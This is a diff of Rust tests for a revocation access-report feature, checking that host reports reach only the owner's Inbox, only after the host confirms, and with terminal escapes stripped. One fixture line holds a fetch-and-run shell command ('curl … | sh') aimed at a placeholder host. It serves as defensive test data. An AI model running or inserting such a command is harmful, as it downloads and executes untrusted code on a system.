@@ -185,20 +185,27 @@ async fn authorized_host_revocation_retains_cleanup_after_authority_retirement()
     eprintln!("login_cleanup pending_after_retirement=true durable_reconnect_confirmed=true");
 }
 
-/// D356: the access report a host returns with its revocation reaches the
-/// owner through the cleanup outbox. It is kept with the receipt that
-/// confirms the revocation, cleaned of terminal escapes, with D353's warning,
-/// readable by the host's owner only, and pending until the host confirms.
+/// The reports waiting in `owner`'s Inbox (D398).
+async fn waiting(fixture: &LoginHost, owner: &str) -> Vec<crate::access_report::Waiting> {
+    crate::access_report::inbox(&fixture.pool, owner)
+        .await
+        .unwrap()
+        .reports
+}
+
+/// D356, D398: the access report a host returns when its person is revoked
+/// (and the host stays) reaches the owner's Inbox through the cleanup outbox.
+/// It is kept with the receipt that confirms the revocation, cleaned of
+/// terminal escapes, with D353's warning, readable by the host's owner only,
+/// and absent until the host confirms.
 #[tokio::test]
 async fn a_revocation_report_is_kept_with_its_receipt_for_the_owner() {
     let fixture = login_host(None).await;
     let retirement = pending_retirement(&fixture).await;
     let owner = fixture.person.to_string();
-    assert_eq!(
-        crate::access_report::read(&fixture.pool, &owner, fixture.host)
-            .await
-            .unwrap(),
-        Some(crate::access_report::Reading::Pending)
+    assert!(
+        waiting(&fixture, &owner).await.is_empty(),
+        "a report existed before the host confirmed"
     );
     let extra = serde_json::json!({
         "warning": "Background programs of this host account may still be running.",
@@ -210,16 +217,11 @@ async fn a_revocation_report_is_kept_with_its_receipt_for_the_owner() {
     });
     reconnect_cleanup_reporting(&fixture, Some(true), Some(extra)).await;
     retirement.await.unwrap().unwrap();
-    let Some(crate::access_report::Reading::Reported { reports, .. }) =
-        crate::access_report::read(&fixture.pool, &owner, fixture.host)
-            .await
-            .unwrap()
-    else {
-        panic!("the confirmed revocation has no report for its owner");
-    };
-    assert_eq!(reports.len(), 1);
-    let (person, report) = &reports[0];
+    let reports = waiting(&fixture, &owner).await;
+    assert_eq!(reports.len(), 1, "the confirmed revocation has no report");
+    let (person, report) = (&reports[0].person, &reports[0].report);
     assert_eq!(*person, fixture.person);
+    assert_eq!(reports[0].host, fixture.host);
     // This fixture host is rootless: the server, not the host, says the
     // report cannot be vouched for, and keeps the files as hints.
     assert_eq!(report.state, crate::access_report::State::NotChecked);
@@ -241,11 +243,8 @@ async fn a_revocation_report_is_kept_with_its_receipt_for_the_owner() {
         account.files[1].lines,
         ["curl -s http://example.invalid/x | sh\u{fffd}[2J"]
     );
-    assert_eq!(
-        crate::access_report::read(&fixture.pool, "owner", fixture.host)
-            .await
-            .unwrap(),
-        None,
+    assert!(
+        waiting(&fixture, "owner").await.is_empty(),
         "another account read this host's report"
     );
 }
@@ -258,16 +257,14 @@ async fn an_older_agents_revocation_reads_not_checked() {
     let retirement = pending_retirement(&fixture).await;
     reconnect_cleanup(&fixture, Some(true)).await;
     retirement.await.unwrap().unwrap();
-    let Some(crate::access_report::Reading::Reported { reports, .. }) =
-        crate::access_report::read(&fixture.pool, &fixture.person.to_string(), fixture.host)
-            .await
-            .unwrap()
-    else {
-        panic!("the confirmed revocation has no report");
-    };
-    assert_eq!(reports[0].1.state, crate::access_report::State::NotChecked);
+    let reports = waiting(&fixture, &fixture.person.to_string()).await;
+    assert_eq!(reports.len(), 1, "the confirmed revocation has no report");
     assert_eq!(
-        reports[0].1.reason,
+        reports[0].report.state,
+        crate::access_report::State::NotChecked
+    );
+    assert_eq!(
+        reports[0].report.reason,
         Some(crate::access_report::Reason::RootlessUnverified),
         "a rootless host's report is never vouched for, older agent or not"
     );
@@ -288,17 +285,14 @@ async fn a_rootless_host_cannot_claim_unchanged() {
     }]}});
     reconnect_cleanup_reporting(&fixture, Some(true), Some(forged)).await;
     retirement.await.unwrap().unwrap();
-    let Some(crate::access_report::Reading::Reported {
-        reports, overall, ..
-    }) = crate::access_report::read(&fixture.pool, &fixture.person.to_string(), fixture.host)
-        .await
-        .unwrap()
-    else {
-        panic!("the confirmed revocation has no report");
-    };
-    assert_eq!(overall, crate::access_report::State::NotChecked);
+    let reports = waiting(&fixture, &fixture.person.to_string()).await;
+    assert_eq!(reports.len(), 1, "the confirmed revocation has no report");
     assert_eq!(
-        reports[0].1.accounts[0].reason,
+        reports[0].report.state,
+        crate::access_report::State::NotChecked
+    );
+    assert_eq!(
+        reports[0].report.accounts[0].reason,
         Some(crate::access_report::Reason::RootlessUnverified)
     );
 }
@@ -454,7 +448,7 @@ async fn reconnect_cleanup_reporting(
         assert_eq!(action_id, "terminal.login.revoke");
         assert_eq!(
             serde_json::from_slice::<serde_json::Value>(input_json).unwrap(),
-            serde_json::json!({"person": fixture.person})
+            serde_json::json!({"person": fixture.person, "report": true}),
         );
         let Some(durable) = durable else {
             // Dropping the socket after receipt models a lost acknowledgement.
